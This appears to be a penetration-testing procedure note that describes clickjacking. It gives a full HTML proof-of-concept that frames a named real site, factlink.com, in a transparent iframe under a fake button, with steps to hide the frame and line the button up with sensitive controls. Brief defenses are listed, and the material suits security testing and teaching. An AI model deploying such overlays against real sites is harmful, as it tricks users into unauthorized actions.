---
tags:
  - clickjacking
  - iframe
  - exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:04.930Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
id: fff3a1e4-764b-4aef-8a24-07248c27a703
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate-Clickjacking-Feasibility

## Summary

This procedure demonstrates clickjacking by embedding a vulnerable site in an iframe on an attacker-controlled page, overlaying elements to simulate tricked interactions like clicks, potentially bypassing CSRF protections.

## Description

In a clickjacking attack, the target site (e.g., https://factlink.com/) is loaded in a transparent or obscured iframe, allowing an attacker to position malicious UI elements over sensitive controls. Users are deceived into interacting with the hidden site, leading to unauthorized actions. This targets web applications without X-Frame-Options. Prerequisites include a local web server or direct HTML file opening in a browser, and confirmed header vulnerability from prior reconnaissance.

## Requirements

1. Web browser (e.g., Chrome, Firefox)
2. Text editor to create HTML demo file
3. Confirmed vulnerable target from header check

## Defense

Defensive measures and detection strategies:

- Enforce X-Frame-Options header on all pages
- Implement JavaScript frame-busting code
- Detect iframe usage in client-side monitoring or server logs for unusual referrers

## Objectives

1. Embed target site in iframe without restrictions
2. Overlay malicious interface to trick interactions
3. Simulate impact like unauthorized clicks

## Instructions

### Step 1: Create Attacker Page with Iframe

**Context**: Build a simple HTML page that embeds the target in an iframe with partial opacity or positioning to overlay elements.

**Command** (No CLI command; use text editor):
```html
<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body style="margin:0;padding:0;">
  <iframe src="https://factlink.com/" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.5;z-index:1;border:none;"></iframe>
  <div style="position:absolute;top:50px;left:50px;z-index:2;">
    <button onclick="alert('Tricked click on hidden site!')">Fake Button</button>
  </div>
</body>
</html>
```

> Save as index.html and open in browser. The iframe loads the target; adjust opacity to 0 for invisibility. Expected: Site embeds seamlessly.

### Step 2: Simulate User Interaction

**Context**: Test by clicking overlaid elements to confirm actions propagate to the iframe, demonstrating potential for CSRF bypass or unauthorized form submissions.

**Command** (Browser interaction; no CLI):

> In the loaded page, click the fake button while ensuring it aligns with a sensitive element in the iframe (e.g., a login button). Observe if the click triggers the hidden action. Expected: Interaction executes on target site without user awareness.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[ui-redressing]]
